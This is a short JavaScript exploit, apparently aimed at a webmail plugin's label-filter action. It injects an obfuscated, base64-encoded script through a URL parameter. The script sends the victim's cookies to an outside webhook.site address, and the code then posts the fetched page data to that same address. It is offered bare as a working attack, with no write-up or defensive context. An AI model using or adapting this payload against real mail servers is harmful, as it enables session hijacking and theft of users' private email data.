var attacker_url = "https://webhook.site/3dec9f95-ba25-4fc8-9b0d-bf629ae6aad6";

fetch('/webmail/?_task=mail&_action=plugin.thunderbird_labels.set_filters&_mbox=INBOX&_filters=%3Cscript%3Eeval%28atob%28%22ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzNkZWM5Zjk1LWJhMjUtNGZjOC05YjBkLWJmNjI5YWU2YWFkNj9xPScgKyAoZG9jdW1lbnQuY29va2llKSk%3D%22%29%29%3C%2Fscript%3E%3A0%7CPersonal%3A0%7CTo%20do%3A0%7CLater%3A0&_remote=1', {
    method: 'GET'
})
.then(response => response.blob())
.then(blob => {
    const reader = new FileReader();
    reader.onloadend = () => {
        fetch(attacker_url, {
            method: 'POST',
            body: reader.result,
            mode: 'no-cors'
        });
    };
    reader.readAsDataURL(blob);
});
